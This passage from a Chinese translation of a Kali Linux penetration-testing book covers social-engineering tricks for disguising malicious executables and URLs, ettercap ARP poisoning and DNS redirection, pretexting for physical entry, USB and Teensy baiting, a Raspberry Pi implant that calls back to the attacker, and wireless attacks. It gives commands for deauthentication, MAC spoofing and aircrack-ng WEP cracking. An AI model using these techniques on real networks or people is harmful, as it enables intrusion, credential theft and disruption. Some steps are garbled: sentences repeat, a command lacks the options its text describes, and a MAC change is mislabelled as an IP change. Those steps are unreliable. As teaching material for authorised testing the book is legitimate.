  \ shell。\n\n![](img/index-208_2.png)\n\n[ 191 ]\n\n# 物理攻击与社会工程\n\n## 隐藏可执行文件和混淆攻击者的\
  \ URL\n如前面的示例所示，发起社会工程攻击成功的关键在于：首先是获取运行它所需的信息——用户名、业务信息以及关于网络、系统和应用的辅助细节。\n\n然而，大部分工作精力集中在第二个方面——设计攻击以诱导目标打开可执行文件或点击链接。\n\
  \n某些攻击产生的模块需要受害者执行它们才能使攻击成功。遗憾的是，用户对于执行未知软件变得越来越警惕。但是，有一些方法可以增加攻击成功执行的可能性，包括以下几种：\n\
  \n- 从目标受害者已知并信任的系统发起攻击，或伪造攻击来源。如果攻击看起来源自帮助台或 IT 支持，并声称是“紧急软件更新”，它很可能会被执行。\n- 将可执行文件重命名为类似于可信软件，例如“Java\
  \ Update”。\n- 使用如 Metasploit 的 `adobe_pdf_embedded_exe_nojs` 等攻击，将恶意负载嵌入 PDF 等良性文件中。可执行文件也可以绑定到\
  \ Microsoft Office 文件、MSI 安装文件或配置为在桌面静默运行的 BAT 文件。\n- 让用户点击下载恶意可执行文件的链接。\n\n由于 SEToolkit\
  \ 使用攻击者的 URL 作为攻击的目标地，成功的关键因素之一是确保攻击者的 URL 对受害者来说是可信的。有几种技术可以实现这一点，包括：\n\n- 使用如\
  \ `goo.gl` 或 `tinyurl.com` 等服务缩短 URL。短链接在 Twitter 等社交媒体上很常见，受害者在点击此类链接时很少采取预防措施。\n\
  - 在 Facebook 或 LinkedIn 等社交媒体网站上输入链接；该网站会创建自己的链接来替换你的链接，并带有目标页面的图像。然后，删除你输入的链接，留下新的社交媒体链接。\n\
  \n[ 192 ]\n\n# 第 7 章\n\n- 在 LinkedIn 或 Facebook 上创建一个虚假网页——作为攻击者，你控制内容，并可以创建一个引人入胜的故事来引导成员点击链接或下载可执行文件。执行良好的页面不仅能针对员工，还可以针对供应商、合作伙伴及其客户，最大化社会工程攻击的成功率。\n\
  - 将链接嵌入到 PowerPoint 等文件中。\n\n要在 PowerPoint 中嵌入链接，请启动它并将扩展名保存为 `.pps` 以创建幻灯片演示。为演示文稿起一个目标人物感兴趣的标题，并创建几个通用的内容文件。在首页，插入一个文本框并拖动框以覆盖该幻灯片的整个表面。点击**插入**（Insert），然后选择**操作**（Action）选项卡。在对话框中，点击**超链接**（Hyperlink）无线按钮，并从下拉菜单中选择\
  \ **URL**。输入用于启动攻击的 URL，如下所示：\n\n![](img/index-210_1.png)\n\n当文件被打开时，它会以全屏幻灯片模式启动。由于攻击是通过鼠标悬停（mouse\
  \ over）发起的，用户在尝试关闭文档时就会触发攻击。\n\n[ 193 ]\n\n# 物理攻击与社会工程\n\n## 使用 DNS 重定向升级攻击\n如果攻击者或渗透测试员入侵了内部网络上的某个主机，他们可以使用\
  \ DNS 重定向来升级攻击。这通常被认为是一种横向攻击（它入侵了访问权限相似的人）；但是，如果获取了特权人员的凭据，它也可以垂直升级。\n\n在这个示例中，我们将使用\
  \ `ettercap`，它作为交换式局域网的嗅探器、拦截器日志记录器。它便于中间人攻击，但我们将使用它来发起 DNS 重定向攻击，将用户重定向到我们用于社会工程攻击的网站。\n\
  \n要开始攻击，我们必须首先位于 `/etc/ettercap/etter.dns` 的 `ettercap` 配置文件，以将查询重定向到我们的恶意站点。配置文件包含一个使用微软站点的示例；复制相同的细节将目标站点请求重定向到恶意\
  \ IP 地址，如下所示：\n\n![](img/index-211_1.png)\n\n在命令提示符中输入 `ettercap -G` 以图形模式启动 `ettercap`。从**嗅探**（Sniff）选项卡，从下拉菜单中选择**统一**（Unified）嗅探，如下所示：\n\
  \n[ 194 ]\n\n# 第 7 章\n\n![](img/index-212_2.jpg)\n\n当提示选择网络接口时，为内部网络选择 `eth0`（如你看到的，当你选择不同的接口时，ettercap\
  \ 也支持无线攻击）。你应该看到选项卡菜单发生变化，为你提供了更多选项。\n\n从**主机**（Hosts）选项卡，从下拉菜单中选择**扫描主机**（Scan\
  \ for hosts）。它将进行快速扫描，然后报告“已向主机列表添加了 x 个主机”。从**主机**选项卡，选择**主机列表**（Hosts list）以查看可能的目标系统列表，如下所示：\n\
  \n![](img/index-212_2.png)\n\n[ 195 ]\n\n# 物理攻击与社会工程\n\n高亮你想要的目标系统（例如，位于交换式局域网同一段上的所有主机），并选择**添加到目标\
  \ 1**（Add to Target 1）选项卡。\n\n完成后后，选择**插件**（Plugins）选项卡，这将为你提供一个可用的 `ettercap` 插件列表。选择\
  \ `ec_dns_spoof.so` 插件，如下所示：\n\n![](img/index-213_1.jpg)\n\n要启动攻击，选择**Mitm**选项卡，并从下拉菜单中选择**ARP\
  \ 污染**（Arp poisoning），如下所示。`ettercap` 将污染所选系统的地址解析协议表或缓存。\n\n![](img/index-213_2.png)\n\
  \n[ 196 ]\n\n# 第 7 章\n\n当选择 ARP 污染时，系统将提供可选参数。选择嗅探远程连接的参数。然后，转到**启动**（Start）选项卡，选择启动统一嗅探。\n\
  \n当任何目标系统上的用户尝试访问 Facebook 时，他们的缓存表将无法为他们提供互联网上的位置。`ettercap` 将他们的查询重定向到你在配置文件中提供的\
  \ URL，用户将被重定向到由攻击者准备的恶意网页，并遭受诸如凭据窃取之类的攻击。\n\n在任何时候，被攻击者在他们的浏览器窗口中都会看到看似正确的 URL。\n\
  \nDNS 重定向可以用于便利所有依赖用户点击 URL 链接来发起的攻击，这在有线和无线网络中均有效。\n\n\n\n\n# 物理访问与敌性设备\n\n`Kali`\
  \ 和 `SEToolkit` 也有助于入侵者在直接物理访问系统和网络的情况下进行攻击。这可能是一种高风险攻击，因为入侵者可能会被警锐的人员发现，或被监控设备捕捉。然而，回报可能是巨大的，因为入侵者可以攻破具有价值数据的特定系统。\n\
  \n物理访问通常是社会工程学的直接结果，特别是当使用身份伪装时。常见的身份伪装包括：\n\n*   一个自称来自帮助热线或 IT 支持部门的人，他们只需要通过安装系统升级来快速中断受害者。\n\
  *   一位顺便拜访客户洽谈的供应商，然后借口去和别人说话或去洗手间。\n*   一名送递包裹的快递员。攻击者可以选择在网上购买制服；然而，由于大多数人认为任何穿全棕色衣服并推着装满箱子的手推车的人都是\
  \ UPS 员，因此在社会工程中，制服并非必需！\n* 穿着工作服、随身带着打印好的“工单”的技工通常被允许进入布线室和其他区域，特别是当他们声称是受大楼经理请求而来时。\n\
  \n[197]\n\n## 物理攻击与社会工程学\n\n*   穿上昂贵的西装，拿着写字板，快走——员工们会认为你是一个未知的经理。在进行此类渗透测试时，我们通常告诉人们我们是审计员，我们的检查很少受到质疑。\n\
  \n敌性物理访问的目标是快速攻破选定的系统；这通常通过在目标机器上安装后门或类似的设备来实现。\n\n经典攻击之一是将 CD-ROM、DVD 或 USB 闪盘插入系统，并让系统使用自动播放选项对其进行安装；然而，许多组织在整个网络中禁用了自动播放。\n\
  \n攻击者还可以创建“有毒诱饵”陷阱——包含某些文件的移动设备，这些文件的名称会引导人们点击文件并查看其内容。一些示例包括：\n\n*   标签为 `Employee\
  \ Salaries`（员工工资）或 `Medical Insurance Updates`（医疗更新）的 USB 闪盘。\n* `Metasploit` 允许攻击者将有效负载（如反向\
  \ shell）绑定到如屏幕保护之类的可执行文件。攻击者可以使用公开的企业图像创建屏幕保护程序，并向员工发送带有新 `endorsed screensaver`\
  \ 的 CD。当用户安装程序时，后门也会被安装，并连接到攻击者。\n*   如果你知道员工参加了最近的会议，攻击者可以伪装成在场的供应商，并向目标发送一封信，暗示这是供应商展会的跟进。一条典型的信息是：“如果您错过了我们的产品演示和一年免费试用，请点击\
  \ `start.exe` 检查随附 USB 闪盘上的幻灯片”。\n\n一个有趣的变体是 `SanDisk U3` USB 闪盘，或称 `Smart Drive`。`U3`\
  \ 闪盘预装了启动器软件，该软件在插入时允许闪盘直接向主机计算机写入文件或注册表信息，以协助快速启动已批准的程序。`u3-pwn` 工具（`Kali Linux`\
  \ | `Maintaining Access` | `OS Backdoors` | `u3-pwn`）会从 `Sandisk U3` 中移除原始 ISO 文件并将其替换为敌性的\
  \ `Metasploit` 有效负载，然后对其进行编码以避免在目标系统上被检测。\n\n遗憾的是，对这些 USB 设备的支持正在减少，它们仍然面临着与其他 `Metasploit`\
  \ 有效负载相同程度的检测。\n\n[198]\n\n## 第 7 章\n\n一种新兴的选择是使用 `Teensy`——这是一种小型集成电路设备，插入基于 Windows\
  \ 的系统时识别为 USB 键盘。这允许它绕过禁用自动运行或使用客户端杀病毒软件的系统。可以在 Amazon 上花约 20 到 25 美元购买一个 `Teensy`。\n\
  \n`setoolkit` 生成了 `Teensy` 转换为攻击向量所需的代码，如下截图所示：\n\n![](img/index-216_1.png)\n\n\
  配置为敌性代理的 `Teensy` 是非常强大的；在对企业客户进行渗透测试期间，我们的测试人员已经证明，有百分之百的概率感染每个受测试网络中的至少一个系统！\n\
  \n遗憾的是，这些设备存在一个很大的局限性——它们只能执行被程序好的功能，且攻击者或渗透测试人员在攻破后利用任何发现的成果的能力有限。\n\n为了弥补这一短板，攻击者现在使用微型计算机（如\
  \ `Raspberry Pi` 树莓派）作为攻击向量。\n\n[199]\n\n### 物理攻击与社会工程学\n\n### 树莓派攻击向量\n\n`Raspberry\
  \ Pi` 是一种微型计算机——尺寸约为 8.5 厘米 x 5.5 厘米，但成功集成了 512 MB RAM、两个 USB 端口和一个由 `Broadcom`\
  \ 芯片支持的以太网端口，该芯片运行着 700 MHz 的 `ARM` 处理器（可以超频到 1 GHz）。它不包含硬盘，而是使用 `SD card` 进行数据存储。如下图所示，`Raspberry\
  \ Pi` 的长度大约是一支笔的三之二；它很容易隐藏在网络中（工作站或服务器后面、放置在服务器机柜内或隐藏在数据中心的地板下）。\n\n![](img/index-217_1.jpg)\n\
  \n要将 `Raspberry Pi` 配置为攻击向量，需要以下物品：\n\n*    `Raspberry Pi Model B` 或更新版本\n*   一根\
  \ `HDMI` 线\n*   一根 `micro USB` 线和充电器\n*   以太网线或无线适配器\n*    `SD card`，Class 10，至少\
  \ 8 GB\n\n这些物品在网上购买的总费用通常低于 100 美元。\n\n[200]\n\n## 第 7 章\n\n使用读卡器将 `SD card` 连接到\
  \ Windows 计算机并打开 `Win32ager`。选择已下载并提取的 Kali 版本 `kali-custom-rpi.img`，将其写入 `SD card`。这需要一些时间。\n\
  \n在 Mac 或 Linux 系统上制作 SD 卡的单独说明可以在 Kali 网站找到。\n\n将新制作的 `SD card` 插入 `Raspberry Pi`，并将以太网线或无线适配器连接到\
  \ Windows 工作站，`HDMI` 线连接到显示器，`Micro USB` 线连接到电源。一旦电源，它将直接进入 `Kali Linux`。树莓派依赖外部电源，没有独立的开关；但是，仍然可以从命令行关闭\
  \ Kali。\n\n在安装 Kali 之后，使用 `apt-get` 命令确保其为最新版本。\n\n尽快更改 `SSH` 主机密钥，因为所有 `Raspberry\
  \ Pi` 镜像都有相同的密钥。使用以下命令：\n\n```\nroot@kali:~rm /etc/ssh/ssh_host_*\nroot@kali:~dpkg-reconfigure\
  \ openssh-server\nroot@kali:~ service ssh restart\n```\n\n同时，确保更改默认的用户名和密码。\n\n\
  下一步是使用 `cron` 配置 `Raspberry` 定期连接到攻击者的计算机（使用静态 IP 地址或动态 DNS 解析服务）。\n\n攻击者随后必须物理访问目标场所并将\
  \ `Raspberry` 连接到网络。大多数网络会自动为设备分配 `DHCP` 地址，并且对这类攻击的控制有限。\n\n\n\n\n\n一旦树莓派连接回攻击者的\
  \ IP 地址，攻击者就可以使用 `SSH` 发布命令，从远程位置对受者的内部网络进行侦察和应用程序攻击。\n\n如果连接了无线适配器（例如 `EW-7811Un`150\
  \ Mbps 无线 802.11b/g/n Nano USB 适配器），攻击者可以进行无线连接，或使用 Pi 启动无线攻击（第 8 章，*利用无线通信*）。\n\
  \n## 物理攻击与社会工程\n\n## 总结\n社会工程是一种*黑入人性*的方法论——利用人类天生的信任和乐于助人的特性攻击网络及其设备。\n\n在本章中，我们研究了如何利用社会工程来促进攻击，旨在收集网络凭据、激活恶意软件或协助发起进一步的攻击。大多数攻击依赖于社会工程工具包（Social\
  \ Engineering Toolkit）；然而，`Kali` 还有其他几个可以使用社会工程方法进行改进的应用程序。我们还研究了物理访问（通常与社会工程结合）如何用于将敌对设备放置在目标网络中。\n\
  \n在下一章中，我们将研究如何对无线网络进行侦察，并攻击开放网络以及受基于 `WEP`、`WPA` 和 `WPA2` 的加密方案保护的网络。我们还将检查无线协议中的通用缺陷，这些缺陷使其容易受到拒绝服务攻击和冒充攻击。\n\
  \n## 利用无线通信\n\n随着移动设备的普及以及对即时网络连接的需求，无线网络已成为无处不在的网络接入点。遗憾的是，无线访问的便利伴随着有效攻击的增加，导致访问权限和数据的丢失以及网络资源的拒绝服务。`Kali`\
  \ 提供了一些工具来配置和启动这些无线攻击，允许组织提高安全性。\n\n在本章中，我们将研究几项管理任务和无线攻击，包括：\n\n- 为无线攻击配置 `Kali`\n\
  - 无线侦察\n- 绕过 MAC 地址身份验证\n- 破解 `WEP` 加密\n- 攻击 `WPA` 和 `WPA2`\n- 无线攻击与社会工程——克隆接入点\n\
  - 拦截通信——无线中间人攻击\n- 无线中间人攻击攻击\n- 针对无线通信的**拒绝服务** (**DoS**) 攻击\n\n### 配置 Kali 用于无线攻击\n\
  `Kali Linux` 发布时带有几种工具以方便无线网络的测试；然而，这些攻击需要大量的配置才能充分发挥作用。此外，测试人员在实施攻击或审计无线网络之前，应该在无线网络方面拥有深背景。\n\
  \n无线安全测试中最重要的工具是无线适配器，它连接到无线接入点。它必须支持所使用的工具，特别是 `aircrack-ng` 工具套件；特别是网卡的芯片组和驱动程序必须具备向通信流注入无线数据包的能力。对于需要向目标与受害者之间的流量注入特定类型数据包的攻击来说，这是一个要求。注入的数据会导致拒绝服务，允许攻击者捕获破解加密密钥所需的握手数据，或支持其他无线攻击。\n\
  \n`aircrack-ng` 网站 (www.aircrack-ng.org) 包含了已知兼容无线适配器的列表。\n\n与 `Kali` 使用的最可靠适配器是\
  \ `ALFA NETWORK` 卡，特别是 `AWUS036NH` 适配器，它支持无线 802.11 b、g 和 n 协议。Alfa 卡在网上很容易买到，并将支持使用\
  \ `Kali` 进行的所有测试和攻击。\n\n## 无线侦察\n进行无线攻击的第一步是进行侦察——这可以识别确切的目标接入点，并突出其他可能影响测试的无线网络。\n\
  \n如果你正在使用 USB 连接的无线网卡连接到 `Kali` 虚拟机，请确保 USB 连接已从主机操作系统断开，并通过点击 USB 连接图标将其挂载到虚拟机，该图标在下面的截图用箭头所示：\n\
  \n![](img/index-221_1.jpg)\n\n### 第 8 章\n\n接下来，通过从命令行运行 `iwconfig` 来确定哪些无线接口是可，如下截图所示：\n\
  \n![](img/index-222_1.png)\n\n对于某些攻击，你可能希望增加适配器的输出功率。如果你与合法的无线接入点同处，并且希望目标连接到你控制的虚假接入点而不是合法接入点，这将特别有用。这些虚假的或**流氓**（rogue）接入点允许攻击者拦截数据并根据需要查看或更改数据以支持攻击。攻击者会经常复制或克隆合法的无线站点，然后增加相对于合法站点的传输功率来吸引受害者。要增加功率，使用以下命令：\n\
  \n```bash\nkali@linux:~# iwconfig wlan0 txpower 30\n```\n\n许多攻击将使用 `aircrack-ng`\
  \ 及其相关工具进行。为了开始，我们需要能够拦截或监控无线传输；因此，我们需要使用 `airmon-ng` 命令将具有无线能力的 `Kali` 通信接口设置为*监听模式*：\n\
  \n```bash\nkali@linux:~# airmon-ng start wlan0\n```\n\n上述命令的执行结果如下截图所示：\n\n![](img/index-222_2.png)\n\
  \n注意，返回的描述表明某些进程*可能会引起麻烦*。处理这些进程的最有效方法是使用全面的 kill 命令，如下：\n\n```bash\nroot@kali:~#\
  \ airmon-ng check kill\n```\n\n要查看本地无线环境，使用以下命令：\n\n```bash\nroot@kali:~# airodump-ng\
  \ mon0\n```\n\n上命令列出了在特定时间点无线适配器范围内可以找到的所有已识别网络。它提供了通过 MAC 地址识别的网络上无线节点的 `BSSID`、相对输出功率的指示、发送的数据包信息、包括使用的通道在内的带宽信息、使用的加密信息，以及提供无线网络名称的\
  \ `ESSID`。这些信息显示在下面的图中；非必要的 `ESSIDs` 已模糊处理：\n\n![](img/index-223_1.png)\n\n`airodump`\
  \ 命令循环遍历可用的无线通道并识别以下内容：\n\n- **基本服务集标识符** (**BSSID**)，用于识别无线接入点或路由的唯一 MAC 地址。\n\
  - 每个网络的 PWR（即功率）。尽管 `airodump-ng` 错误地显示功率为负值，但这是一种报告伪影。要获得正确的正值，请访问终端并运行 `airdriver-ng\
  \ unload 36`，然后运行 `airdriver-ng load 35`。\n- `CH` 显示正在广播的通道。\n- `ENC` 显示正在使用的加密——如果没有使用加密则为\
  \ `OPN`（开放），如果使用了加密则为 `WEP` 或 `WPA/WPA2`。`CIPHER` 和 `AUTH` 提供额外的加密信息。\n- **扩展服务集标识符**\
  \ (**ESSID**) 是由共享相同 SSID 或名称的接入点组成的无线网络通用名称。\n\n在终端窗口的下半部分，你将看到尝试连接或已连接无线网络的站（stations）。\n\
  \n\n\n\n\n在我们与任何这些（潜在的）目标网络进行交互之前，我们必须确认无线适配器是否具备数据包注入的能力。要做到这一点，请在终端命令行提示符中运行以下命令：\n\
  \n```\nroot@kali:~# aireplay-ng -9 mon0\n```\n\n上一条命令的执行结果如所示。在这里，`-9` 表示注入测试。\n\
  \n![](img/index-224_1.png)\n\n## Kismet\n无线侦察领域最重要的工具之一是 `Kismet`，它是一个 802.11 无线检测器、数据嗅探器和入侵检测系统。\n\
  \n`Kismet` 可用于收集以下信息：\n\n• 无线网络名称，ESSID\n• 无线网络的信道\n\n[207]\n\n*无线通信利用*\n\n• 接入点的\
  \ MAC 地址，BSSID\n• 无线客户端的 MAC 地址\n\n它还可以用于嗅探来自 802.11a、802.11b、802.11g 和 802.11n\
  \ 的无线流量。`Kismet` 同时也支持插件，允许它嗅探其他无线协议。\n\n要启动 `Kismet`，在终端窗口的命令行中输入 `kismet`。\n\n\
  当 `Kismet` 启动时，你将面临一系列问题，允许你在启动过程中对其进行配置。对 `Can you see colors` 回复 `Yes`，接受 `Kismet\
  \ is running as root`，并在 `Start Kismet Server` 上选择 `Yes`。在 `Kismet` 启动选项中，取消勾选 `Show\
  \ Console`，因为它会遮挡屏幕。允许 `Kismet` 启动。\n\n系统会提示你添加一个捕获接口；通常会选择 `wlan0`。\n\n`Kismet`\
  \ 将开始嗅探数据包并收集有关相邻物理区域内所有无线系统的信息。\n\n![](img/index-225_1.jpg)\n\n[208]\n\n## 第 8\
  \ 章\n通过双击网络可以将你进入网络视图，该视图提供了有关无线网络的额外信息。\n\n你还可以向下钻，以识别连接到各种无线网络的特定客户端。\n\n使用 `Kismet`\
  \ 作为初始侦察工具来启动某些特定的攻击（例如嗅探传输的数据）或识别网络。由于它是被动地收集连接数据，因此它是识别隐藏网络的极佳工具，特别是当 `SSID` 未公开传输时。\n\
  \n### 绕过隐藏的服务集标识符\nESSID 是唯一标识无线局域网安全网络的字符序列。隐藏 `ESSID` 是一种试图通过隐蔽性来实现目标的劣方法；遗憾的是，可以通过以下方式获取\
  \ `ESSID`：\n\n• 嗅探无线环境并等待客户端关联到网络，然后捕获该关联\n• 主动对客户端进行取消验证（deauthenticating），强制客户端关联，然后捕获该关联\n\
  \n`airrack` 工具特别适用于捕获取消隐藏 `ESSID` 所需的数据，步骤如下所示：\n\n1. 在命令行提示符处，通过以下命令确认攻击系统的无线功能已启用：\n\
  ```\nroot@kali:~# airmon-ng\n```\n\n2. 接下来，使用以下 `ifconfig` 命令查看可用接口，并确定你的无线系统使用的确切名称：\n\
  ```\nroot@kali:~# ifconfig\n```\n\n3. 输入以下内容启用你的无线接口（你可能需要将 `wlan0` 替换为上一步中识别的可用无线接口）：\n\
  ```\nroot@kali:~# airmon-ng start wlan0\n```\n\n[209]\n\n*无线通信利用*\n\n4. 如果你再次用 `ifconfig`\
  \ 确认，你会发现现在有一个正在使用的监控或 `mon0` 地址。现在，使用 `airodump` 确认可用的无线网络，命令如下：\n```\nroot@kali:~#\
  \ airodump-ng mon0\n```\n\n![](img/index-227_1.png)\n\n如你所见，第一个网络的 `ESSID` 仅识别为\
  \ `<`。没有使用其他名称或标记。隐藏 `ESSID` 的长度被识别为由九字符组成；然而，由于 `ESSID` 是隐藏的，此值可能是不正确的。真实的 `ESSID`\
  \ 长度实际上可能比九个字符短或长。\n\n重要的是，可能有客户端连接到这个特定的网络。如果存在客户端，我们将取消客户端的验证，强制他们在重新连接到接入点时发送\
  \ `ESSID`。\n\n重新运行 `airodump`，并过滤掉目标接入点以外的所有内容。在特定情况下，我们将使用以下命令关注收集来自六号信道上隐藏网络的数据：\n\
  ```\nroot@kali:~# airodump-ng -c 6 mon0\n```\n\n执行该命令消除了多个无线源的输出，允许攻击者专注于目标 `ESSID`，如下屏所示：\n\
  \n![](img/index-227_2.png)\n\n当执行 `airodump` 命令时得到的数据表明，有一个站点 (`00:0E:2E:CF:8C:7C`)\
  \ 连接到 `BSSID` (`00:18:39:D5:5D:61`)，而该 BSSID 又关联到隐藏的 `ESSID`。\n\n[210]\n\n## 第 8\
  \ 章\n为了在 `ESSID` 传输时捕获它，我们必须创建一个已知将被发送的——在客户端与接入点连接的初始阶段。\n\n因此，我们将通过发送破坏连接的数据包流，对客户端和接入点同时取消验证攻击。\n\
  \n要启动攻击，打开一个新的命令行并输入如下所示的命令（`0` 表示我们正在启动取消验证攻击，`1` 表示我们将发送，`-a` 是目标接入点，`c` 是客户端的\
  \ MAC 地址）：\n\n![](img/index-228_1.png)\n\n在发送所有取消验证数据包后，返回原始监控六号信道网络的窗口，如下所示。你现在将看到明文形式的\
  \ `ESSID`。\n\n![](img/index-228_2.png)\n\n知道 `ESSID` 有助于攻击者确认他们关注的是正确的网络，并简化登录过程。\n\
  \n媒体介质访问控制 (`MAC`) 地址唯一地标识网络中的每个节点。它的形式由六对十六进制数字（0 到 9 和字母 A 到 F）组成，用冒号或连字符符分隔，通常像这样：`00:50:56:C0:00:01`。\n\
  \n[211]\n\n*无线通信利用*\n\n`MAC` 地址通常与网络适配器或具有网络能力的设备相关；由于这个原因，它经常被称为物理地址。\n\n`MAC`\
  \ 地址中的前三对数字被称为组织唯一标识符（Organizational Unique Identifier），用于识别制造或销售该设备的公司。后三对数字是特定于设备的，可以被视为序列号。\n\
  \n由于 `MAC` 地址是唯一的，它可以被用于将用户关联到特定的网络，特别是无线网络。这具有两个重大意义——它可以用于识别尝试访问网络的黑客或合法网络测试人员，并且可以作为验证个人并授予其网络访问权的手段。\n\
  \n在渗透测试期间，测试人员可能希望对网络保持匿名。支持这种匿名配置的一种方法是更改攻击系统的 `MAC` 地址。\n\n这可以通过 `ifconfig` 命令手动完成。要确定现有的\
  \ `MAC` 地址，从命令行 运行以下内容：\n\n```\nroot@kali:~# ifconfig wlan0 down\n```\n\n```\nroot@kali:~#\
  \ ifconfig wlan0 | grep HW\n```\n\n要手动更改 IP 地址，使用以下命令：\n\n```\nroot@kali:~# ifconfig\
  \ wlan0 hw ether 38:33:15:xx:xx:xx\n```\n\n```\nroot@kali:~# ifconfig wlan0 up\n\
  ```\n\n\n\n\n将 \"xx\" 表达式替换为不同的十六进制对。此命令允许我们把攻击系统的 MAC 地址更改为受害者网络接受的地址。攻击者必须确保该\
  \ MAC 地址在网络中未被占用，否则如果网络受到监控，重复的 MAC 地址可能会触发报警。\n\n在更改 MAC 地址之前，必须先禁用无线接口。\n\nKali\
  \ 还允许使用自动化工具 `macchanger`。要将攻击者的 MAC 地址更改为同一厂商生产的产品 MAC 地址，请在终端窗口中使用以下 `macchanger`\
  \ 命令：\n\n```\nroot@kali:~# macchanger wlan0 -e\n```\n\n**[ 212 ]**\n\n## 第 8 章\n\
  \n要将现有 MAC 地址更改为完全随机的 MAC 地址，请使用以下命令：\n\n```\nroot@kali:~# macchanger wlan0 -r\n\
  ```\n\n![](img/index-230_1.png)\n\n一些攻击者在测试期间频繁更改其 MAC 地址以实现活动匿名。\n\n许多组织，特别是像学院和大学等大型学术团体，使用\
  \ MAC 地址过滤来控制谁可以访问其无线网络资源。MAC 地址过滤利用网卡上的唯一 MAC 地址来控制对网络资源的访问；在典型配置中，组织维护一个允许访问网络的\
  \ MAC 地址**白名单**。如果接入的 MAC 地址不在批准的访问列表中，它将被限制连接网络。\n\n遗憾的是，MAC 地址信息是明文传输的。攻击者可以使用\
  \ `airodump` 收集接受的 MAC 地址列表，然后手动将自己的 MAC 地址更改为目标网络接受的地址之一。因此，这种类型的过滤对无线网络几乎没有提供实际保护。\n\
  \n无线网络的下一层级保护是通过使用加密提供的。\n\n## 破解 WEP 加密\n\n无线等效隐私（**WEP**）于 1999 年诞生，旨在为 802.11\
  \ 无线网络提供某种程度的机密性，这与有线网络相当。在其加密实现中很快被发现了许多缺陷，到 2004 年，它被 **WiFi 保护访问**（**WPA**）协议所取代。\n\
  \nWEP 今日仍在使用，特别是在那些无法支持新型路由器资源需求的旧网络中。在最近对一个大大都市的无线调查中，几乎有 25% 的加密无线网络继续使用 WEP。这些网络中许多与金融公司有关。\n\
  \n**[ 213 ]**\n\n#### *利用无线通信*\n\nWEP 的主要缺陷之一首先发现在初始化向量（**IV**）的重用上。WEP 依赖于 RC4\
  \ 加密算法，这是一种流密码——相同的加密密钥不能重复。引入 `IV` 的目的是通过向加密数据中引入随机元素来防止密钥重用。遗憾的是，24 位的 `IV` 太短，无法防止重复；此外，有\
  \ 50% 的概率在仅传输 5,000 个数据包后，同一个 `IV` 就会重复。\n\n攻击者可以窃听或截获 WEP 加密的流量。根据可用检查的截获数据包数量，可以快速恢复密钥。在实践中，大多数\
  \ WEP 密钥可以在三分钟内恢复或破解。\n\n要使对 WEP 的破解生效，你还需要知道关于目标的以下信息：\n\n- 无线网络名称或 ESSID\n- 接入点的\
  \ MAC 地址，BSSID\n- 使用的无线通道\n- 无线客户端的 MAC 地址\n\n针对 WEP 最常见的攻击可以通过执行以下步骤完成：\n\n1. 首先，使用以下命令识别可用的无线网络接口：\n\
  \n```\nroot@kali:~# airmon-ng\n```\n\n2. 停止接口以将 MAC 地址更改为已与目标网络关联的现有使用的地址。你也可以在这一步使用\
  \ `macchanger`。当 MAC 地址更改后，重启 `airmon-ng`。使用以下命令执行这些步骤：\n\n```\nroot@kali:~# airmon-ng\
  \ stop\nroot@kali:~# ifconfig wlan0 down\nroot@kali:~# ifconfig wlan0 hw ether (mac\
  \ address)\nroot@kali:~# airmon-ng start wlan0\n```\n\n使用已知且接受的 MAC 地址可以简化攻击。然而，并非总是如此。这种攻击假设你*不知道*\
  \ MAC 地址。相反，我们将与网络建立一个伪关联。\n\n**[ 214 ]**\n\n3. 使用以下 `airodump` 命令定位目标无线网络：\n\n\
  ```\nroot@kali:~# airodump-ng wlan0\n```\n\n当 `airodump` 定位到目标时，按下 `Ctrl` + `C`\
  \ 停止搜索。复制 `BSSID` 中的 MAC 地址，并记录通道。当 `airodump` 定位到目标时，按下 `Ctrl` + `C` 停止搜索。复制 `BSSID`\
  \ 中的 MAC 地址，并记录通道；在后续截图所示的示例中，目标网络 `dd_wep` 在六号通道运行，速度为 11 MB。\n\n![](img/index-232_1.png)\n\
  \n4. 使用以下命令启动 `airodump-ng` 来嗅探无线流量并收集 `IVs`，其中 `--bssid` 允许我们选择目标的 BSSID，`-c` 表示通道，`-w`\
  \ 允许我们写入输出名称：\n\n```\nroot@kali:~# airodump-ng wlan0\n```\n\n\n\n\n`aircrack-ng`\
  \ 命令可用于破解 WEP 密钥，其中 `-a 1` 强制攻击模式为静态 WEP，`-b` 是 BSSID，而 `dd_wep.cap` 是包含已捕获 IV 的提取文件。\n\
  \n```bash\nroot@kali:~# aircrack-ng -a 1 -b 00:06:25:9A:A9:C6 -n 64 dd_wep.cap\n\
  ```\n\n如如下截图所示，攻击成功了，密钥已识别识别。（尽管它显示为十六进制数，但你只需直接输入即可登录 WEP 网络。）\n\n![](img/index-234_1.png)\n\
  \n尽管本次演示侧重于 64 位密钥，但一旦你从接入点获取了足够的 IV，更长的密钥在破解时所需的时间不会显著增加。\n\n`aircrack-ng` 工具套件是“金标准”，提供了获取访问的最可靠、最有效的方法。然而，Kali\
  \ 还带了其他几种工具，可以帮助你破解加密的无线网络。\n\n其中之一是 Fern WiFi Cracker，它是一个包含了 `aircrack-ng` 的 Python\
  \ GUI 界面。它可以自动扫描无线网络并识别 WEP、WPA 和 WPA2 网络。一旦识别出网络，攻击者就可以利用多项功能，包括：\n\n- 使用多种攻击手段进行\
  \ WEP 破解，包括分段、Chop Chop、Caffe Latte、Hirte、ARP 请求重放或 WPS 攻击\n- 使用字典攻击或基于 WPS 的攻击进行\
  \ WPA 和 WPA2 破解\n- 成功破解后自动将密钥保存到数据库中\n- 支持会话劫取的内部中间人引擎\n- 针对 HTTP、HTTPS、Telnet 和\
  \ FTP 的暴力破解攻击\n\n**[217]**\n\n*利用无线通信攻击*\n\nFern 的界面非常整洁，设置过程引导用户选择接口并扫描接入点。它会报告\
  \ WEP 和 WPA/WPA2 的接入点；从这一步起，只需点击相应的按钮启动攻击即可。Fern 的初始启动屏幕如下所示所示：\n\n![](img/index-235_1.jpg)\n\
  \n尽管 Fern 是一个非常优秀的工具，但大多数测试人员并不完全依赖它——如果未能识别密钥或获取网络访问，失败原因可能隐藏在 GUI 之后，导致故障排除变得困难。\n\
  \n类似的应用程序是 Wifite 无线审计工具，它提供了一个文本界面来支持测试。它在现场测试中被证明非常有效，并利用了包括以下的功能：\n\n- Wifite\
  \ 在攻击前将攻击者的 MAC 地址更改为随机 MAC 地址以实现匿名，并在所有攻击完成后将其改回\n- 它按信号强度（dB）对目标进行排序，优先破解距离最近的接入点\n\
  - 它会自动对隐藏网络的客户端进行取消认证，以显示 SSID\n- 它支持多种攻击类型\n\n**[218]**\n\n## 第 8 章\n\n在如下所示所示示例中，选择了一个单一目标\
